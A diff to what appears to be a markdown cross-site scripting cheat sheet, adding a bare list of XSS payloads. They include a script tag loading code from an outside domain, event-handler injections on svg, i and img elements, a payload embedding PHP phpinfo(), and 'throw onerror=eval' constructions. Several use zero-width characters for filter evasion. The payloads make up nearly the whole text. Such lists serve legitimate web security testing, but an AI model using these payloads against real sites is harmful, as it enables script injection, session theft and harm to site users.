@@ -101,3 +101,24 @@ if we add a `</style>test123<script>alert()</script>`
 
 
 
+### Other examples
+
+```html
+<​script/src=//⑮.rs>
+<i/oncut​=alert()> (CTRL +X )
+<svg/onload​=alert()
+```
+
+```html
+'<​script>alert(<?php phpinfo() ;? >);<​/script>
+```
+
+```html
+img/src=x onerror​=/*--*/alert()
+```
+
+```html
+throw onerror​=alert,1337
+
+throw onerror​=eval,'=alert\x281\x29'
+```
